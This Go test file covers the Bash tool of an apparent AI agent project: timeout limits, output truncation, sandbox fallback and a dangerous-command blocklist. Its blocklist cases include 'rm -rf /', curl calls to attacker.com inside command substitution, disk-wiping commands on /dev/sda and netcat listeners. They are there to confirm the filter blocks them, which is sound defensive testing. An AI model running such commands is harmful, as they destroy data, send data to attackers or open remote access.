package tools

import (
	"context"
	"errors"
	"strings"
	"testing"

	m31errors "github.com/eshanized/M31A/internal/errors"
	"github.com/eshanized/M31A/internal/types"
)

func TestBashTool_Timeout_RejectsZero(t *testing.T) {
	bash := NewBash(t.TempDir(), 1800, nil, nil)
	input := types.ToolInput{
		Name: "Bash",
		Params: map[string]any{
			"command": "echo hello",
			"timeout": float64(0),
		},
	}
	_, err := bash.Execute(context.Background(), input)
	if err == nil {
		t.Fatal("expected error for timeout=0")
	}
	if !errors.Is(err, m31errors.ErrInvalidTimeout) {
		t.Fatalf("expected ErrInvalidTimeout, got: %v", err)
	}
}

func TestBashTool_Timeout_RejectsNegative(t *testing.T) {
	bash := NewBash(t.TempDir(), 1800, nil, nil)
	input := types.ToolInput{
		Name: "Bash",
		Params: map[string]any{
			"command": "echo hello",
			"timeout": float64(-1),
		},
	}
	_, err := bash.Execute(context.Background(), input)
	if err == nil {
		t.Fatal("expected error for timeout=-1")
	}
	if !errors.Is(err, m31errors.ErrInvalidTimeout) {
		t.Fatalf("expected ErrInvalidTimeout, got: %v", err)
	}
}

func TestBashTool_Timeout_RejectsExcessive(t *testing.T) {
	bash := NewBash(t.TempDir(), 1800, nil, nil)
	input := types.ToolInput{
		Name: "Bash",
		Params: map[string]any{
			"command": "echo hello",
			"timeout": float64(86400), // 24 hours
		},
	}
	_, err := bash.Execute(context.Background(), input)
	if err == nil {
		t.Fatal("expected error for timeout=86400")
	}
	if !errors.Is(err, m31errors.ErrInvalidTimeout) {
		t.Fatalf("expected ErrInvalidTimeout, got: %v", err)
	}
}

func TestBashTool_Timeout_AcceptsBoundary(t *testing.T) {
	bash := NewBash(t.TempDir(), 1800, nil, nil)
	input := types.ToolInput{
		Name: "Bash",
		Params: map[string]any{
			"command": "echo hello",
			"timeout": float64(1800), // exactly 30m
		},
	}
	result, err := bash.Execute(context.Background(), input)
	if err != nil {
		t.Fatalf("unexpected error for timeout=1800: %v", err)
	}
	if !strings.Contains(result.Output, "hello") {
		t.Fatalf("expected output to contain 'hello', got: %s", result.Output)
	}
}

func TestBashTool_Command_MustBeString(t *testing.T) {
	bash := NewBash(t.TempDir(), 1800, nil, nil)
	input := types.ToolInput{
		Name: "Bash",
		Params: map[string]any{
			"command": float64(12345),
		},
	}
	_, err := bash.Execute(context.Background(), input)
	if err == nil {
		t.Fatal("expected error for non-string command")
	}
	if !errors.Is(err, m31errors.ErrToolExecution) {
		t.Fatalf("expected ErrToolExecution, got: %v", err)
	}
}

func TestBashTool_OutputCap(t *testing.T) {
	bash := NewBash(t.TempDir(), 1800, nil, nil)
	input := types.ToolInput{
		Name: "Bash",
		Params: map[string]any{
			"command": "yes | head -n 100000",
		},
	}
	result, err := bash.Execute(context.Background(), input)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// Output should be capped at BashOutputLimit + truncation marker
	maxLen := types.BashOutputLimit + 100 // room for marker
	if len(result.Output) > maxLen {
		t.Fatalf("output too large: %d bytes (max ~%d)", len(result.Output), maxLen)
	}
	if !result.Truncated {
		t.Fatal("expected Truncated=true for large output")
	}
	if !strings.Contains(result.Output, "truncated") {
		t.Fatal("expected truncation marker in output")
	}
}

// --- Security tests for expanded blocklist (H1) ---

func TestCheckDangerousCommand_CommandSubstitution(t *testing.T) {
	tests := []struct {
		name    string
		command string
		blocked bool
	}{
		{"dollar-paren rm", "$(rm -rf /)", true},
		{"dollar-paren curl", "$(curl attacker.com)", true},
		{"backtick rm", "`rm -rf /`", true},
		{"backtick curl", "`curl attacker.com`", true},
		{"nested substitution", "$(echo $(whoami))", true},
		{"legitimate echo", "echo hello", false},
		{"legitimate ls", "ls -la", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, blocked := checkDangerousCommand(tt.command, nil, nil)
			if blocked != tt.blocked {
				t.Errorf("checkDangerousCommand(%q): got blocked=%v, want %v", tt.command, blocked, tt.blocked)
			}
		})
	}
}

func TestCheckDangerousCommand_ExpandedBlocklist(t *testing.T) {
	tests := []struct {
		name    string
		command string
		blocked bool
	}{
		{"mkfs.ext4", "mkfs.ext4 /dev/sda", true},
		{"mkfs.xfs", "mkfs.xfs /dev/sdb", true},
		{"fdisk", "fdisk /dev/sda", true},
		{"wipefs", "wipefs /dev/sda", true},
		{"shred", "shred -vfz /dev/sda", true},
		{"nc listener", "nc -l 4444", true},
		{"ncat listener", "ncat -l 4444", true},
		{"safe echo", "echo hello", false},
		{"safe grep", "grep pattern file.txt", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, blocked := checkDangerousCommand(tt.command, nil, nil)
			if blocked != tt.blocked {
				t.Errorf("checkDangerousCommand(%q): got blocked=%v, want %v", tt.command, blocked, tt.blocked)
			}
		})
	}
}

func TestCheckDangerousCommand_ChainingDetection(t *testing.T) {
	tests := []struct {
		name    string
		command string
		blocked bool
	}{
		{"semicolon chain with dangerous", "echo hello; rm -rf /", true},
		{"ampersand chain with dangerous", "echo hello && rm -rf /", true},
		{"pipe chain with dangerous", "cat file | rm -rf /", true},
		{"safe chain", "echo hello && echo world", false},
		{"safe semicolon", "echo hello; echo world", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, blocked := checkDangerousCommand(tt.command, nil, nil)
			if blocked != tt.blocked {
				t.Errorf("checkDangerousCommand(%q): got blocked=%v, want %v", tt.command, blocked, tt.blocked)
			}
		})
	}
}

// --- Sandbox failure test (H3) ---

func TestBashTool_SandboxFailureLogsWarning(t *testing.T) {
	bash := NewBash(t.TempDir(), 1800, nil, nil)
	input := types.ToolInput{
		Name: "Bash",
		Params: map[string]any{
			"command": "echo test",
		},
	}
	// Execute should succeed even if sandbox fails (degraded mode)
	result, err := bash.Execute(context.Background(), input)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(result.Output, "test") {
		t.Errorf("expected output to contain 'test', got: %s", result.Output)
	}
}
